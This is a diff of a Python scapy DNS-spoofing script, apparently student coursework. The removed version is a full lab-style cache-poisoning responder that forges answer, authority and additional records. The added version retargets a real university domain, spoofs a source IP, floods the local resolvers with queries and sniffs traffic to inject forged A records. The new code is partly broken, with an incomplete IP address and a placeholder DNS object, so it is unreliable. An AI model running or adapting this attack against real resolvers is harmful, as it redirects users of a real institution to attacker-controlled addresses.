@@ -1,47 +1,63 @@
-import scapy
-
-# Sculpt DNS Query packet
-
-# Look at replies, maybe with another thread?
-## compare IP of mapping with our malicious IP, if cmp it true, good, if not launch attack again
-
 #!/usr/bin/env python3
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sniff
 from scapy.all import *
+import threading
+import platform
+import re
+import subprocess
+
+def get_dns_servers():
+    dns_servers = []
+    if platform.system() == 'Windows':
+        output = subprocess.check_output(['ipconfig', '/all']).decode('utf-8')
+        dns_servers = re.findall(r'DNS Servers[\s\S]*?: ([\d\.]+)', output)
+    elif platform.system() == 'Linux':
+        with open('/etc/resolv.conf', 'r') as file:
+            for line in file:
+                if line.startswith('nameserver'):
+                    dns_servers.append(line.split()[1])
+    elif platform.system() == 'Darwin':  # macOS
+        output = subprocess.check_output(['scutil', '--dns']).decode('utf-8')
+        dns_servers = re.findall(r'nameserver\[\d+\]\s*: ([\d\.]+)', output)
+
+    return dns_servers
+
+_LOCAL_DNS_SERVER = get_dns_servers()
+
+if _LOCAL_DNS_SERVER:
+    print("DNS Servers:")
+    for server in _LOCAL_DNS_SERVER:
+        print(server)
+else:
+    print("No DNS servers found.")
+
+_TARGET_DOMAIN = 'myhwu.hw.ac.uk'
+dns_request = IP(dst=_LOCAL_DNS_SERVER) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=_TARGET_DOMAIN))
+
+def send_dns_requests():
+    for i in range(10):  # Adjust the number of requests as needed
+        send(dns_request)
+        print("Sent DNS request:", i)
 
 def spoof_dns(pkt):
-  if (DNS in pkt and 'www.example.net' in pkt[DNS].qd.qname.decode('utf-8')):
+    #print("Received packet:", pkt.summary())
+    if (DNS in pkt and _TARGET_DOMAIN in pkt[DNS].qd.qname.decode('utf-8')):
+      print(pkt.sprintf("{DNS: %IP.src%--> %IP.dst%: %DNS.id%}"))
+      ip = IP(src='137.195.101.250',dst='192.')
+      udp = UDP(dport=53)
+      Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='10.0.2.4')
+      dns = DNS(...)
+      # Create a DNS object
+      spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
+      send(spoofpkt)
 
-    # Swap the source and destination IP address
-    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
+def sniff_pkt():
+  # Start sniffing packets in the main thread
+  sniff(iface='eth0', filter='udp and dst port 53', prn=spoof_dns)
 
-    # Swap the source and destination port number
-    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+# Start a thread for sniffing DNS requests
+sniff_thread = threading.Thread(target=sniff_pkt)
+sniff_thread.start()
 
-    # The Answer Section
-    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
-                 ttl=259200, rdata='10.0.2.5')
-
-    # The Authority Section
-    NSsec1 = DNSRR(rrname='example.net', type='NS',
-                   ttl=259200, rdata='ns1.example.net')
-    NSsec2 = DNSRR(rrname='example.net', type='NS',
-                   ttl=259200, rdata='ns2.example.net')
-
-    # The Additional Section
-    Addsec1 = DNSRR(rrname='ns1.example.net', type='A',
-                    ttl=259200, rdata='1.2.3.4')
-    Addsec2 = DNSRR(rrname='ns2.example.net', type='A',
-                    ttl=259200, rdata='5.6.7.8')
-
-    # Construct the DNS packet
-    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
-                 qdcount=1, ancount=1, nscount=2, arcount=2,
-                 an=Anssec, ns=NSsec1/NSsec2, ar=Addsec1/Addsec2)
-
-    # Construct the entire IP packet and send it out
-    spoofpkt = IPpkt/UDPpkt/DNSpkt
-    send(spoofpkt)
-
-# Sniff UDP query packets and invoke spoof_dns().
-f = 'udp and dst port 53'
-pkt = sniff(iface='br-2f902169a472', filter=f, prn=spoof_dns)      
+send_dns_requests()
+# dns_response = IP(dst=_LOCAL_DNS_SERVER) / UDP(dport=53) / DNS(id=12345, qr=1, aa=1, an=DNSRR(rrname=_TARGET_DOMAIN, ttl=0))
